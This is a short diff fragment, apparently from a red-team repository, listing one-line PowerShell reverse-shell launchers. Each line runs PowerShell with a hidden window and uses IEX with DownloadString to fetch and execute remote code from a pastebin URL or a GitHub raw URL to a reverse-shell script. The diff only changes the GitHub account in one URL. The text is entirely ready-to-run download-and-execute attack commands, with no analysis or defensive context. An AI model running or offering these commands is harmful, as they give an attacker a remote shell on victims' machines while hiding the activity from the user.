@@ -7,4 +7,4 @@ powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('h
 powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/3AZZA38V');"
 
 VIA GITHUB:
-powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Reverse_Shell/one_line_PS_Rev_Shell_1.txt');"
+powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/t3l3m3try/Red_Team/master/Reverse_Shell/one_line_PS_Rev_Shell_1.txt');"
